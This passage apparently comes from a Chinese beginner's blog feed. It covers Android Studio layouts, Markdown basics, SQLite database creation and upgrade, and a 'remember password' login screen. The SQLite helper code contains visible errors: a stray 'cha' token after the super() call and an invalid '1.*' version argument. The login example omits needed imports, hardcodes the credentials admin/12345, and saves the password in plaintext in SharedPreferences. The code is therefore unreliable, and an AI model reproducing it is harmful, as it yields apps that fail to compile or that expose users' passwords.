class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">EditText</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/editText&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:hint</span>=<span class="hljs-string">&quot;Hello World!&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/button&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;创建数据库&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/button_insert&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;94dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;39dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;新增&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.5&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/editText&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.1&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/button_updata&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;更改&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.5&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/button_insert&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.1&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/button_delete&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;删除&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.5&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/button_updata&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.1&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/button_select&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;查询&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/button_delete&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MD学习</title>
    <link href="/2021/04/01/Markdown/MD%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/01/Markdown/MD%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p><strong>hello world</strong></p><p><em>hello world</em></p><p><em><strong>hello world</strong></em></p><p><del>Hello World</del></p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><blockquote><p>引用的内容</p></blockquote><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><hr><hr><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p><img src="https://nn4cdn.nikkigames.cn/xiaomaoqiu/12443e726c4a8a0cf66e544095e348f9.png" alt="截图"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p><a href="http://127.0.0.1/">超链接</a></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ol><li><p>a</p></li><li><p>b</p></li><li><p>c</p></li></ol><ul><li><p>a</p></li><li><p>b</p></li><li><p>c</p></li></ul><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><table><thead><tr><th>名字</th><th>性别</th><th>生日</th></tr></thead><tbody><tr><td>张三</td><td>男</td><td>2000.1.8</td></tr></tbody></table><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">java<br></code></pre></div></td></tr></table></figure><p><code>hello</code></p>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 数据库建立</title>
    <link href="/2021/04/01/AndroidStudio/Android%20Studio%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BB%BA%E7%AB%8B/"/>
    <url>/2021/04/01/AndroidStudio/Android%20Studio%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BB%BA%E7%AB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-数据库建立"><a href="#Android-Studio-数据库建立" class="headerlink" title="Android Studio 数据库建立"></a>Android Studio 数据库建立</h1><h2 id="相关介绍"><a href="#相关介绍" class="headerlink" title="相关介绍"></a>相关介绍</h2><p>Android内置SQLite数据库，SQLite是一 款轻量级关系数据库,<br>Android内置SQliteOpenHelper帮助类想要使用我们需要自己创建类去继承它<br>借助这个类可以对数据库进行创建升级<br>它有两个方法onCreate () 和onUpgrade () 我们要自己重写<br>然后分别在这两个方法中实现创建，升级数据库的逻辑<br>还有非常重要两个实例方法: getReadableDatabase ()和getWritableDatabase ()<br>这两个方法都可以创建或打开一个现有的数据库(如果已存在则直接打开，否则创建一个新的数据库)<br>并返回一个可对数据库进行读写操作的对象。<br>当数据库不可写入时(如磁盘空间已满)<br>getReadableDatabase () 方法返回的对象将以只读的方式去打开数据库<br>getWritableDatabase ()方法则将出现异常</p><h2 id="相关实现代码"><a href="#相关实现代码" class="headerlink" title="相关实现代码"></a>相关实现代码</h2><p>简单实现。</p><p>MyDatabaseHelper.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.databasetest;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.database.ContentObservable;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteDatabase;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteOpenHelper;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteTransactionListener;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-comment">//继承相关的数据库</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyDatabaseHelper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SQLiteOpenHelper</span> </span>&#123;<br>    <span class="hljs-comment">//构建数据库语句</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String CREAT_BOOK=<span class="hljs-string">&quot;Create table Book(&quot;</span><br>            +<span class="hljs-string">&quot;id integer primary key autoincrement,&quot;</span><br>            +<span class="hljs-string">&quot;author text,&quot;</span><br>            +<span class="hljs-string">&quot;price real,&quot;</span><br>            +<span class="hljs-string">&quot;pages integer,&quot;</span><br>            +<span class="hljs-string">&quot;name text)&quot;</span>;<br>    <span class="hljs-keyword">private</span> Context mContext;<br>    <span class="hljs-comment">//第二个数据库名，第三个返回一个自定义的langs，四版本号</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyDatabaseHelper</span><span class="hljs-params">(Context context,String name,SQLiteDatabase.CursorFactory factory,<span class="hljs-keyword">int</span> version)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(context,name,factory,version);cha<br>        mContext=context;<br>    &#125;<br>    <span class="hljs-comment">//重构相关的生命周期语句</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(SQLiteDatabase db)</span> </span>&#123;<br>        <span class="hljs-comment">//创建数据库</span><br>        db.execSQL(CREAT_BOOK);<br>        Toast.makeText(mContext,<span class="hljs-string">&quot;Create succeeded&quot;</span>,Toast.LENGTH_SHORT).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onUpgrade</span><span class="hljs-params">(SQLiteDatabase db, <span class="hljs-keyword">int</span> oldVersion, <span class="hljs-keyword">int</span> newVersion)</span> </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.databasetest;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteOpenHelper;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">//声明对象</span><br>    <span class="hljs-keyword">private</span> MyDatabaseHelper dbHelper;<br>    <span class="hljs-keyword">private</span> Button button=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-comment">//新建对应对象变量属性</span><br>        dbHelper=<span class="hljs-keyword">new</span> MyDatabaseHelper(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;BookStore.dp&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-number">1</span>);<br>        button=(Button)findViewById(R.id.button);<br>        button.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//监听并启动</span><br>                dbHelper.getWritableDatabase();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过更新的方法更新数据库</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//仅显示变化代码 </span><br><span class="hljs-comment">//需要添加的一个表 注意不能使用int会产生报错 </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String CREATE_CATEGORY=<span class="hljs-string">&quot;create table Category(&quot;</span><br>    +<span class="hljs-string">&quot;id integer primary key autoincrement,&quot;</span><br>    +<span class="hljs-string">&quot;category_name text,&quot;</span><br>    +<span class="hljs-string">&quot;category_code integer)&quot;</span>;<br><span class="hljs-comment">//需要更新的生命周期函数</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-comment">//多添加一个需要建立的表</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(SQLiteDatabase db)</span> </span>&#123;<br>    db.execSQL(CREAT_BOOK);<br>    db.execSQL(CREATE_CATEGORY);<br>    Toast.makeText(mContext,<span class="hljs-string">&quot;Create succeeded&quot;</span>,Toast.LENGTH_SHORT).show();<br>&#125;<br><span class="hljs-comment">//若更新后则判断是否存在表并删除并查新建立表</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onUpgrade</span><span class="hljs-params">(SQLiteDatabase db, <span class="hljs-keyword">int</span> oldVersion, <span class="hljs-keyword">int</span> newVersion)</span> </span>&#123;<br>    db.execSQL(<span class="hljs-string">&quot;drop table if exists Book&quot;</span>);<br>    db.execSQL(<span class="hljs-string">&quot;drop table if exists Category&quot;</span>);<br>    onCreate(db);<br>&#125;<br><span class="hljs-comment">//设置版本比最开始的大</span><br>dbHelper=<span class="hljs-keyword">new</span> MyDatabaseHelper(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;BookStore.dp&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-number">1.</span>*);<br></code></pre></div></td></tr></table></figure><h2 id="查看数据库的插件"><a href="#查看数据库的插件" class="headerlink" title="查看数据库的插件"></a>查看数据库的插件</h2><p>Database Navigator</p><p>下载app中数据后进行查看</p>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 保持登录</title>
    <link href="/2021/04/01/AndroidStudio/Android%20Studio%20%E4%BF%9D%E6%8C%81%E7%99%BB%E5%BD%95/"/>
    <url>/2021/04/01/AndroidStudio/Android%20Studio%20%E4%BF%9D%E6%8C%81%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-保存登录"><a href="#Android-Studio-保存登录" class="headerlink" title="Android Studio 保存登录"></a>Android Studio 保存登录</h1><p>该案例按照上一案例进行更改</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.broadcastbestpractive;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-comment">//需要将该活动继承至BaseActivity从而方便广播</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseActivity</span> </span>&#123;<br>    <span class="hljs-comment">//建立对应的按钮或文本变量</span><br>    <span class="hljs-keyword">private</span> EditText accountEdit;<br>    <span class="hljs-keyword">private</span> EditText pwEdit;<br>    <span class="hljs-keyword">private</span> Button login;<br>    <span class="hljs-comment">//新增部分</span><br>    <span class="hljs-keyword">private</span> SharedPreferences pref;<br>    <span class="hljs-keyword">private</span> SharedPreferences.Editor editor;<br>    <span class="hljs-keyword">private</span> CheckBox rememberPass;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_login);<br>        <span class="hljs-comment">//获取对应按钮或文本的内容根据id</span><br>        accountEdit=(EditText)findViewById(R.id.accountEdit);<br>        pwEdit=(EditText)findViewById(R.id.pwEdit);<br>        login=(Button)findViewById(R.id.login);<br>        <span class="hljs-comment">//新增部分</span><br>        <span class="hljs-comment">//声明对应变量及赋值</span><br>        pref = PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword">this</span>);<br>        rememberPass=(CheckBox)findViewById(R.id.rememberPass);<br>        <span class="hljs-keyword">boolean</span> isRemember=pref.getBoolean(<span class="hljs-string">&quot;remeber_password&quot;</span>,<span class="hljs-keyword">false</span>);<br>        <span class="hljs-comment">//如果是选择的存储就赋值</span><br>        <span class="hljs-keyword">if</span>(isRemember)&#123;<br>            String account=pref.getString(<span class="hljs-string">&quot;account&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>            String pw=pref.getString(<span class="hljs-string">&quot;pw&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>            accountEdit.setText(account);<br>            pwEdit.setText(pw);<br>            rememberPass.setChecked(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-comment">//对login按钮进行监听</span><br>        login.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                String account=accountEdit.getText().toString();<br>                String pw=pwEdit.getText().toString();<br>                <span class="hljs-comment">//若账户密码正确进行跳转</span><br>                <span class="hljs-keyword">if</span> (account.equals(<span class="hljs-string">&quot;admin&quot;</span>)&amp;&amp;pw.equals(<span class="hljs-string">&quot;12345&quot;</span>))&#123;<br>                    <span class="hljs-comment">//新增部分</span><br>                    <span class="hljs-comment">//设置存储</span><br>                    editor=pref.edit();<br>                    <span class="hljs-keyword">if</span>(rememberPass.isChecked())&#123;<br>                        editor.putBoolean(<span class="hljs-string">&quot;remeber_password&quot;</span>,<span class="hljs-keyword">true</span>);<br>                        editor.putString(<span class="hljs-string">&quot;account&quot;</span>,account);<br>                        editor.putString(<span class="hljs-string">&quot;pw&quot;</span>,pw);<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-comment">//清楚内容</span><br>                        editor.clear();<br>                    &#125;<br>                    editor.apply();<br>                    <br>                    Intent intent=<span class="hljs-keyword">new</span> Intent(LoginActivity.<span class="hljs-keyword">this</span>,MainActivity.class);<br>                    startActivity((intent));<br>                    finish();<br>                &#125;<span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">//进行提示账号或密码错误</span><br>                    Toast.makeText(LoginActivity.<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;account or password is invalid&quot;</span>,Toast.LENGTH_SHORT).show();<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio SharedPreferences</title>
    <link href="/2021/04/01/AndroidStudio/Android%20Studio%20SharedPreferences/"/>
    <url>/2021/04/01/AndroidStudio/Android%20Studio%20SharedPreferences/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-SharedPreferences"><a href="#Android-Studio-SharedPreferences" class="headerlink" title="Android Studio SharedPreferences"></a>Android Studio SharedPreferences</h1><p>利用SharedPreferences 存储数据及读取数据</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 